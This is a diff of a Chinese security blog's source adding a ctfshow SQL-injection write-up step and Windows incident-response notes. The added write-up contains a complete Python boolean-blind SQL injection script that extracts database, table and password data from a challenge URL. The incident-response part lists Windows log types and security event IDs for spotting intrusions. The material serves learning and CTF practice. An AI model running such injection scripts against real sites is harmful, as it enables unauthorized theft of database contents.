@@ -8512,10 +8512,11 @@
 <p>这里id&#x3D;2没报错，说明是有数据的，但是这里显示无数据，就是被过滤了</p>
 <p>所以这里的话是打不了正常的联合注入了，因为内容都被过滤了，根据上面我进行的两个测试不同的结果，所以我们可以试一下盲注，通过回显的不同去查询数据库，表名，表中列名，数据</p>
 <p>盲注的话手工会特别繁琐，所以我们用脚本去打</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> reques</span><br></pre></td></tr></table></figure>
+<p>爆数据库长度</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#GET请求的布尔盲注</span></span><br><span class="line">    <span class="comment">#爆破数据库的长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_length</span>(<span class="params">url, headers</span>):</span><br><span class="line">    databaselen = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        databaselen_payload = <span class="string">f&quot;?id=1&#x27; and length(database())=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + databaselen_payload, headers=headers)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            databaselen = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字长度为:  &#x27;</span>+ <span class="built_in">str</span>(databaselen))</span><br><span class="line">    <span class="keyword">return</span> databaselen</span><br><span class="line"></span><br><span class="line">    <span class="comment">#爆破数据库的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_database_name</span>(<span class="params">url, headers, databaselen</span>):</span><br><span class="line">    databasename = <span class="string">&#x27;&#x27;</span>   </span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,databaselen+<span class="number">1</span>):<span class="comment">#用来爆破数据库的字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            databasechar_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr(database(),<span class="subst">&#123;l&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + databasechar_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                databasename += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(databasename)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据库名字为:  &#x27;</span>+ <span class="built_in">str</span>(databasename))</span><br><span class="line">    <span class="keyword">return</span> databasename</span><br><span class="line"> <span class="comment">#爆破表的个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_count</span>(<span class="params">url, headers, databasename</span>):</span><br><span class="line">    tablecount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):<span class="comment">#用来爆破表的个数</span></span><br><span class="line">        tablecount_payload = <span class="string">f&quot;?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;databasename&#125;</span>&#x27;) =<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">        response = requests.get(url + tablecount_payload, headers=headers) </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">            tablecount = l</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;表的个数为: <span class="subst">&#123;tablecount&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> tablecount</span><br><span class="line"><span class="comment">#爆破表的名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_name</span>(<span class="params">url, headers, tablecount,databasename</span>):</span><br><span class="line">    tables=[]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tablecount):</span><br><span class="line">        table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        tablelen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">            tablelen_payload = <span class="string">f&quot;?id=1&#x27; and length((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1))=<span class="subst">&#123;l&#125;</span>--+&quot;</span></span><br><span class="line">            response = requests.get(url + tablelen_payload, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                tablelen = l</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的长度为: <span class="subst">&#123;tablelen&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tablelen+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">                table_name_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;<span class="subst">&#123;databasename&#125;</span>&#x27; limit <span class="subst">&#123;t+<span class="number">0</span>&#125;</span>, 1),<span class="subst">&#123;m&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">                response = requests.get(url + table_name_payload, headers=headers)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:</span><br><span class="line">                    table_name += <span class="built_in">chr</span>(i)</span><br><span class="line">                    <span class="built_in">print</span>(table_name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;表<span class="subst">&#123;t+<span class="number">1</span>&#125;</span>的名字为: <span class="subst">&#123;table_name&#125;</span>&#x27;</span>)</span><br><span class="line">        tables.append(table_name)</span><br><span class="line">    <span class="keyword">return</span> tables</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#爆破字段的个数</span></span><br><span class="line"><span class="string">def brute_force_column_count(url, headers, tables):</span></span><br><span class="line"><span class="string">    column_count = 0</span></span><br><span class="line"><span class="string">    for l in range(1, 50):</span></span><br><span class="line"><span class="string">        column_countpayload = f&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;&#123;tables&#125;&#x27;)=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">        response = requests.get(url + column_countpayload, headers=headers)</span></span><br><span class="line"><span class="string">        if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">            column_count = l</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    print(f&#x27;表 &#123;tables&#125; 有 &#123;column_count&#125; 字段.&#x27;) </span></span><br><span class="line"><span class="string">    return column_count</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查询表中字段</span></span><br><span class="line"><span class="string">def brute_force_column_name(url, headers,tables, column_count):</span></span><br><span class="line"><span class="string">    columns = []</span></span><br><span class="line"><span class="string">    for c in range(column_count):</span></span><br><span class="line"><span class="string">        column_name = &#x27;&#x27;</span></span><br><span class="line"><span class="string">        for l in range(1, 50):</span></span><br><span class="line"><span class="string">            column_count_payload = f&quot;?id=1&#x27; and length((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1))=&#123;l&#125;--+&quot;</span></span><br><span class="line"><span class="string">            response = requests.get(url + column_count_payload, headers=headers)</span></span><br><span class="line"><span class="string">            if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                column_count = l</span></span><br><span class="line"><span class="string">                print(f&#x27;表 &#123;tables&#125; 中字段 &#123;c+1&#125; 的个数为: &#123;column_count&#125;&#x27;)</span></span><br><span class="line"><span class="string">        for m in range(1, column_count+1):</span></span><br><span class="line"><span class="string">            for i in range(32, 128):</span></span><br><span class="line"><span class="string">                column_name_payload = f&quot;?id=1&#x27; and ascii(SUBSTR((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name=&#x27;&#123;tables&#125;&#x27; LIMIT &#123;c&#125;,1),&#123;m&#125;,1))=&#x27;&#123;i&#125;&#x27;--+&quot;</span></span><br><span class="line"><span class="string">                response = requests.get(url + column_name_payload, headers=headers)</span></span><br><span class="line"><span class="string">                if &#x27;admin&#x27;in response.text:</span></span><br><span class="line"><span class="string">                    column_name += chr(i)</span></span><br><span class="line"><span class="string">                    print(column_name)</span></span><br><span class="line"><span class="string">                    break</span></span><br><span class="line"><span class="string">        print(f&#x27;表 &#123;tables&#125;  中字段 &#123;c+1&#125; 的名字为: &#123;column_name&#125;&#x27;)</span></span><br><span class="line"><span class="string">        columns.append(column_name)</span></span><br><span class="line"><span class="string">    return columns</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#查询表中数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_table_data</span>(<span class="params">url, headers,tables</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):<span class="comment">#用来爆破表中的数据</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            data_payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select password from <span class="subst">&#123;tables&#125;</span> where username=&#x27;flag&#x27;),<span class="subst">&#123;c+<span class="number">0</span>&#125;</span>,1))=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;--+&quot;</span></span><br><span class="line">            response = requests.get(url + data_payload, headers=headers) </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span><span class="keyword">in</span> response.text:<span class="comment">#判断是否存在注入</span></span><br><span class="line">                data += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag为:  &#x27;</span>+ <span class="built_in">str</span>(data))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&#x27;http://598dad09-8ca9-4769-9d38-8f62ee4186c7.challenge.ctf.show//api/v4.php&#x27;</span></span><br><span class="line">    success_message = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    databaselen = brute_force_database_length(url, headers)</span><br><span class="line">    databasename = brute_force_database_name(url, headers, databaselen)</span><br><span class="line">    tablecount = brute_force_table_count(url, headers, databasename)</span><br><span class="line">    tables = brute_force_table_name(url, headers, tablecount, databasename)</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="comment">#column_count = brute_force_column_count(url, headers, table)   </span></span><br><span class="line">        <span class="comment">#columns = brute_force_column_name(url, headers,table, column_count)</span></span><br><span class="line">        data = brute_force_table_data(url, headers,table)</span><br></pre></td></tr></table></figure>
 
-
-
+<p>运行结果</p>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241204195501485-1733313306034-6.png" alt="image-20241204195501485"></p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
@@ -8530,7 +8531,9 @@
     <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>应急响应的话我认为是每一个学信安的人需要去学习的，所以我也是对此进行了响应的学习和积累，希望在以后发生真实的事件时能第一时间进行良好的反馈</p>
 <p>借鉴师傅的文章:(这里的话还是有点多的，毕竟这个话题的分区还是蛮多的)</p>
 <p><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html">https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5.html</a></p>
-<p><a href="https://www.freebuf.com/articles/network/286270.html">https://www.freebuf.com/articles/network/286270.html</a></p>
+<p>windows入侵排查:<a href="https://www.freebuf.com/articles/network/286270.html">https://www.freebuf.com/articles/network/286270.html</a></p>
+<p>windows分析事件日志:<a href="https://zone.huoxian.cn/d/868-windows">https://zone.huoxian.cn/d/868-windows</a></p>
+<p>常见Windows事件ID状态码:<a href="https://www.cnblogs.com/chddt/p/13262385.html">https://www.cnblogs.com/chddt/p/13262385.html</a></p>
 <h1 id="0x02应急响应"><a href="#0x02应急响应" class="headerlink" title="0x02应急响应"></a>0x02应急响应</h1><p>在学习应急响应之前，我们首先要先了解什么是应急响应</p>
 <h2 id="什么是应急响应？"><a href="#什么是应急响应？" class="headerlink" title="什么是应急响应？"></a>什么是应急响应？</h2><p>应急响应（Incident Response Service，IRS）是当企业系统遭受病毒传播、网络攻击、黑客入侵等安全事件导致信息业务中断、系统宕机、网络瘫痪，数据丢失、企业声誉受损，并对组织和业务运行产生直接或间接的负面影响时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，同时分析入侵原因、还原入侵过程、评估业务损失、溯源黑客取证并提出解决方案和防范措施，减少企业因黑客带来的相关损失。</p>
 <h2 id="常见的应急响应事件分类"><a href="#常见的应急响应事件分类" class="headerlink" title="常见的应急响应事件分类"></a>常见的应急响应事件分类</h2><p>web入侵：网页挂马、主页篡改、Webshell</p>
@@ -8538,7 +8541,7 @@
 <p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p>
 <p>讲完了基础的概念，接下来我们进行学习不同的一些应急响应的排查思路</p>
 <h2 id="一-windows入侵排查"><a href="#一-windows入侵排查" class="headerlink" title="一.windows入侵排查"></a>一.windows入侵排查</h2><p>如果我们的Windows操作系统被黑客入侵或攻击了，我们第一要做的不是怎么去做防御和应急响应，而是去分析黑客入侵的过程，然后根据可能的入侵点逐步去拆解分析，这样才能更快更高效的进行应急响应</p>
-<h3 id="分析入侵过程"><a href="#分析入侵过程" class="headerlink" title="分析入侵过程"></a>分析入侵过程</h3><p>攻击者入侵windows系统往往从弱口令、系统漏洞以及服务漏洞进行切入，获得一个普通的系统权限，再经过提权后进行创建启动项、修改注册表、植入病毒和木马等一系列操作，从而维持对目标主机的控制权(也就是我们说的权限维持)。而与此同时操作系统也会出现异常，包括账户、端口、进程、网络、启动、服务、任务以及文件等，系统运维人员可以根据以上异常情况来知道<code>攻击者从何处入侵</code>、<code>攻击者以何种方式入侵</code>以及<code>攻击者在入侵后做了什么</code>这几个问题的答案，从而为之后的系统加固、安全防护提供针对性建议。</p>
+<h3 id="分析入侵过程"><a href="#分析入侵过程" class="headerlink" title="分析入侵过程"></a>分析入侵过程</h3><p>攻击者入侵windows系统往往从弱口令、系统漏洞以及服务漏洞进行切入，获得一个普通的系统权限，再经过提权后进行创建启动项、修改注册表、植入病毒和木马等一系列操作，从而维持对目标主机的控制权(也就是我们说的权限维持)。而与此同时操作系统也会出现异常，包括账户、端口、进程、网络、启动、服务、任务以及文件等，系统运维人员可以根据以上异常情况来知道攻击者从何处入侵、攻击者以何种方式入侵以及攻击者在入侵后做了什么这几个问题的答案，从而为之后的系统加固、安全防护提供针对性建议。</p>
 <p>暴力破解：针对系统有包括rdp、ssh、telnet等，针对服务有包括mysql、ftp等，一般可以通过超级弱口令工具、hydra进行爆破</p>
 <p>漏洞利用：通过系统、服务的漏洞进行攻击，如永恒之蓝、Redis未授权访问等</p>
 <p>流量攻击：主要是对目标机器进行dos攻击，从而导致服务器瘫痪</p>
@@ -8719,7 +8722,16 @@
 <p>4.得到发现webshell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p>
 <p> a、利用 Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。</p>
 <p> b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p>
-<h4 id="1-5日志分析"><a href="#1-5日志分析" class="headerlink" title="1.5日志分析"></a>1.5日志分析</h4><p>主要查看系统日志和web日志，通过日志可以帮助我们验证对入侵过程的判断和发现其他入侵行为。但它的前提则是日志记录已开启的情况下才能获取。这块具体会在之后的日志分析篇提到</p>
+<h4 id="1-5日志分析"><a href="#1-5日志分析" class="headerlink" title="1.5日志分析"></a>1.5日志分析</h4><p>windows日志分为五类</p>
+<ul>
+<li>应用程序日志–安装应用程序产生的事件</li>
+<li>安全日志–主要记录用户操作产生的日志，例如登入&#x2F;登出，清除日志等。</li>
+<li>Setup日志 #安装日志–记录安装中间件或者框架类似的事件产生的日志。</li>
+<li>系统日志–主要记录关于windwos系统产生的事件id</li>
+<li>Forwarded Events日志 #转发日志–一般没什么值得看的</li>
+</ul>
+<p>主要查看系统日志和web日志，通过日志可以帮助我们验证对入侵过程的判断和发现其他入侵行为。但它的前提则是日志记录已开启的情况下才能获取。这块具体会在之后的日志分析篇提到</p>
+<p>进行Windows安全日志分析首先需要了解一些事件ID</p>
 <p>系统日志</p>
 <ul>
 <li><p>分析方法：</p>
@@ -8728,6 +8740,121 @@
 <p>C、可以直接分析(包括应用程序、安全、Setup、系统、事件)也可以导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析。</p>
 </li>
 </ul>
+<h5 id="常见的Windows事件ID"><a href="#常见的Windows事件ID" class="headerlink" title="常见的Windows事件ID"></a>常见的Windows事件ID</h5><ul>
+<li>### 用户操作事件id ### </li>
+<li>1102-清理审计日志 </li>
+<li>1105-自动备份事件日志 </li>
+<li>4624-帐户已成功登录 </li>
+<li>4625-帐户登录失败 </li>
+<li>4634-帐户被注销包括锁屏 </li>
+<li>4647-用户发起注销 </li>
+<li>4648-使用显式凭据尝试登录 </li>
+<li>4649-检测到重播攻击 </li>
+<li>4657-修改注册表值 </li>
+<li>4665-尝试创建应用程序客户端上下文。 </li>
+<li>4666-应用程序尝试了一个操作 </li>
+<li>4670-对象的权限已更改 </li>
+<li>4672-给新登录分配特权 </li>
+<li>4674-尝试对特权对象执行操作 </li>
+<li>4692-尝试备份数据保护主密钥 </li>
+<li>4696-主要令牌已分配给进程 </li>
+<li>4697-添加服务</li>
+</ul>
+<p><strong>计划任务事件id</strong></p>
+<ul>
+<li>4698-已创建计划任务 </li>
+<li>4699-计划任务已删除 </li>
+<li>4700-已启用计划任务 </li>
+<li>4701-计划任务已禁用 </li>
+<li>4702-计划任务已更新 </li>
+<li>4703-令牌权已经调整 </li>
+<li>4704-已分配用户权限 </li>
+<li>4705-用户权限已被删除 </li>
+<li>4706-为域创建了新的信任 </li>
+<li>4707-已删除对域的信任 </li>
+<li>4709-IPsec服务已启动 </li>
+<li>4710-IPsec服务已禁用 </li>
+<li>4713-Kerberos策略已更改 </li>
+<li>4717-系统安全访问权限已授予帐户 </li>
+<li>4718-系统安全访问已从帐户中删除 </li>
+<li>4719-系统审核策略已更改 </li>
+<li>4720-已创建用户帐户 </li>
+<li>4722-用户帐户已启用 </li>
+<li>4723-尝试更改帐户的密码 </li>
+<li>4724-尝试重置帐户密码 </li>
+<li>4725-用户帐户已被禁用 </li>
+<li>4726-用户帐户已删除 </li>
+<li>4727-已创建启用安全性的全局组 </li>
+<li>4728-已将成员添加到启用安全性的全局组中 </li>
+<li>4729-成员已从启用安全性的全局组中删除 </li>
+<li>4730-已删除启用安全性的全局组 </li>
+<li>4731-已创建启用安全性的本地组 </li>
+<li>4732-已将成员添加到启用安全性的本地组 </li>
+<li>4733-成员已从启用安全性的本地组中删除 </li>
+<li>4734-已删除已启用安全性的本地组 </li>
+<li>4735-已启用安全性的本地组已更改 </li>
+<li>4737-启用安全性的全局组已更改 </li>
+<li>4738-用户帐户已更改 </li>
+<li>4740-用户帐户已被锁定 </li>
+<li>4741-已创建计算机帐户 </li>
+<li>4742-计算机帐户已更改 </li>
+<li>4743-计算机帐户已删除 </li>
+<li>4744-已创建禁用安全性的本地组 </li>
+<li>4745-已禁用安全性的本地组已更改 </li>
+<li>4746-已将成员添加到已禁用安全性的本地组</li>
+<li>4747-已从安全性已禁用的本地组中删除成员 </li>
+<li>4756-已将成员添加到启用安全性的通用组中 </li>
+<li>4765-SID历史记录已添加到帐户中 </li>
+<li>4767-用户帐户已解锁 </li>
+<li>4768-请求了Kerberos身份验证票证（TGT） </li>
+<li>4769-请求了Kerberos服务票证 </li>
+<li>4770-更新了Kerberos服务票证 </li>
+<li>4774-已映射帐户以进行登录 </li>
+<li>4775-无法映射帐户以进行登录 </li>
+<li>4776-域控制器尝试验证帐户的凭据 </li>
+<li>4777-域控制器无法验证帐户的凭据 </li>
+<li>4778-会话重新连接到Window Station </li>
+<li>4782-密码哈希帐户被访问 </li>
+<li>4794-尝试设置目录服务还原模式管理员密码 </li>
+<li>4797-试图查询帐户是否存在空白密码 </li>
+<li>4798-枚举了用户的本地组成员身份。 </li>
+<li>4799-已枚举启用安全性的本地组成员身份 </li>
+<li>4800-工作站已锁定 </li>
+<li>4801-工作站已解锁 </li>
+<li>4802-屏幕保护程序被调用</li>
+</ul>
+<p><strong>域相关事件id</strong> </p>
+<ul>
+<li>4820-Kerberos票证授予票证（TGT）被拒绝，因为该设备不符合访问控制限制 </li>
+<li>4821-Kerberos服务票证被拒绝，因为用户，设备或两者都不符合访问控制限制 </li>
+<li>4822-NTLM身份验证失败，因为该帐户是受保护用户组的成员 </li>
+<li>4823-NTLM身份验证失败，因为需要访问控制限制 </li>
+<li>4825-用户被拒绝访问远程桌面。默认情况下，仅当用户是Remote Desktop Users组或Administrators组的成员时才允许用户进行连接</li>
+</ul>
+<p><strong>防火墙策略事件id</strong> </p>
+<ul>
+<li>4946-已对Windows防火墙例外列表进行了更改。增加了一条规则 </li>
+<li>4947-已对Windows防火墙例外列表进行了更改。规则被修改了 </li>
+<li>4948-已对Windows防火墙例外列表进行了更改。规则已删除 </li>
+<li>5024-Windows防火墙服务已成功启动 </li>
+<li>5025-Windows防火墙服务已停止</li>
+</ul>
+<p><strong>目录服务事件id</strong> </p>
+<ul>
+<li><p>5137-已创建目录服务对象 </p>
+</li>
+<li><p>5140-访问了网络共享对象 </p>
+</li>
+<li><p>5142-添加了网络共享对象。 </p>
+</li>
+<li><p>5145-检查网络共享对象以查看是否可以向客户端授予所需的访问权限 </p>
+</li>
+<li><p>5156-Windows筛选平台允许连接 5157-Windows筛选平台已阻止连接</p>
+</li>
+<li><p>事件ID 7045 - 系统中安装了服务</p>
+</li>
+</ul>
+<p>突然出现未知服务可能表明恶意软件安装,因为许多类型的恶意软件会将自己安装为服务。</p>
 <p>WEB访问日志</p>
 <ul>
 <li><p>分析方法：</p>
